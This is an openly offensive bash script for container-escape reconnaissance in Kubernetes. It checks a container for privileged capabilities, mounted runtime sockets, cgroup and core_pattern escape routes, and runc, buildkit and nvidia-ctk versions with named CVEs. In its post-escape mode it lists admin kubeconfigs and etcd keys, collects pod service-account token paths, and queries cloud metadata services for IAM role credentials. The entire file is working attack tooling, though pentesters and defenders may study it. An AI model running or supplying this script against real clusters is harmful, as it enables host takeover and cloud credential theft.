#!/usr/bin/env bash
# escape_enum.sh - In-container / post-escape enumeration for breakout opportunities.
#
# USAGE:
#   bash escape_enum.sh            # run INSIDE the target container (recon)
#   bash escape_enum.sh --node     # run AFTER escape, as root on the node (loot kube creds + IMDS)
#
# Dependencies: coreutils, awk, sed, grep. Optional: capsh, jq, crictl, curl (used if present).
# No writes to disk; read-only reconnaissance. Output is plain text to stdout.
set -u
H() { printf '\n==== %s ====\n' "$1"; }
have() { command -v "$1" >/dev/null 2>&1; }

NODE=0; [ "${1:-}" = "--node" ] && NODE=1

H "Identity / namespace"
id 2>/dev/null
echo "hostname: $(hostname 2>/dev/null)"
echo "container?: $(grep -qaE 'docker|kubepods|containerd|libpod' /proc/1/cgroup 2>/dev/null && echo yes || echo maybe-no)"
echo "pid1 exe: $(ls -la /proc/1/exe 2>/dev/null)"
echo "hostPID (pid1 is host init?): $(readlink /proc/1/exe 2>/dev/null | grep -qE '/(sbin/init|systemd)$' && echo LIKELY-YES || echo no)"

H "Capabilities"
if have capsh; then capsh --print 2>/dev/null
else
  capeff=$(grep CapEff /proc/self/status 2>/dev/null | awk '{print $2}')
  echo "CapEff=$capeff"
  # 0x1fffffffff / 0x3fffffffff => full caps == privileged
  case "$capeff" in *fffffffff) echo ">> FULL capability set -> likely --privileged";; esac
fi
for c in cap_sys_admin cap_sys_ptrace cap_sys_module cap_dac_read_search cap_dac_override; do
  have capsh && capsh --print 2>/dev/null | grep -qi "$c" && echo ">> DANGEROUS cap present: $c"
done

H "Dangerous mounts / sockets"
for s in /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock \
         /var/run/crio/crio.sock; do
  [ -S "$s" ] && echo ">> RUNTIME SOCKET mounted: $s  (host takeover possible)"
done
echo "-- mountinfo (hostPath / host fs / cgroup) --"
grep -E '(/|cgroup|/etc|/var/lib/kubelet|/proc|/dev/sd|/dev/nvme) ' /proc/self/mountinfo 2>/dev/null \
  | awk '{print $5, $9, $10}' | sort -u | head -40
[ -w /proc/sys/kernel/core_pattern ] && echo ">> /proc/sys/kernel/core_pattern is WRITABLE -> core_pattern escape"
( mount -t cgroup cgroup /tmp/.__c 2>/dev/null && echo ">> can mount cgroup-v1 -> release_agent escape" && umount /tmp/.__c 2>/dev/null; rmdir /tmp/.__c 2>/dev/null ) || true

H "Runtime versions (CVE triage)"
for b in runc docker containerd crictl buildctl buildkitd nvidia-ctk nvidia-container-cli; do
  have "$b" && echo "$b: $($b --version 2>/dev/null | head -1)"
done
echo ">> runc <=1.1.11 => CVE-2024-21626 ; runc <=1.2.7/1.3.2 => CVE-2025-31133/52565/52881"
echo ">> buildkit <=0.12.4 => CVE-2024-23651/52/53 ; nvidia-ctk <=1.17.7 => CVE-2025-23266"
ls -la /proc/self/fd/ 2>/dev/null | grep -E ' 7 | 8 | 9 ' && echo ">> probe fd 7/8/9 with runc_cwd_escape.py"

H "Kubernetes context"
SA=/var/run/secrets/kubernetes.io/serviceaccount
if [ -f "$SA/token" ]; then
  echo ">> ServiceAccount token mounted: $SA/token"
  echo "   namespace: $(cat "$SA/namespace" 2>/dev/null)"
  echo "   apiserver: https://${KUBERNETES_SERVICE_HOST:-?}:${KUBERNETES_SERVICE_PORT:-?}"
  echo "   -> run k8s_rbac_audit.py with this token"
fi
echo "kubelet :10250 reachable from here?"
have curl && curl -skm3 "https://${KUBERNETES_SERVICE_HOST:-127.0.0.1}:10250/pods" >/dev/null 2>&1 \
  && echo ">> kubelet :10250 responds -> kubelet_exec.py" || echo "   (no/blocked)"

H "Ingress-nginx version (IngressNightmare CVE-2025-1974)"
have curl && for ns in ingress-nginx kube-system; do
  curl -skm3 "https://ingress-nginx-controller-admission.$ns.svc:443/" >/dev/null 2>&1 \
    && echo ">> admission webhook reachable in ns=$ns (check controller <1.11.5/<1.12.1)"
done

if [ "$NODE" = "1" ]; then
  H "[NODE] kube credentials on disk"
  ls -la /etc/kubernetes/ 2>/dev/null
  for f in /etc/kubernetes/admin.conf /var/lib/kubelet/pki/kubelet-client-current.pem \
           /var/lib/kubelet/kubeconfig /etc/kubernetes/pki/etcd/server.key; do
    [ -e "$f" ] && echo ">> $f present"
  done
  H "[NODE] harvest pod SA tokens"
  find /var/lib/kubelet/pods -path '*/kubernetes.io/serviceaccount/token' 2>/dev/null | head -50
  H "[NODE] cloud IMDS"
  if have curl; then
    T=$(curl -sm2 -X PUT http://169.254.169.254/latest/api/token \
        -H 'X-aws-ec2-metadata-token-ttl-seconds: 60' 2>/dev/null)
    [ -n "$T" ] && echo "AWS role: $(curl -sm2 -H "X-aws-ec2-metadata-token: $T" \
        http://169.254.169.254/latest/meta-data/iam/security-credentials/ 2>/dev/null)"
    curl -sm2 -H 'Metadata-Flavor: Google' \
       http://169.254.169.254/computeMetadata/v1/instance/service-accounts/ 2>/dev/null | head -3
  fi
fi
echo; echo "[*] enumeration complete"
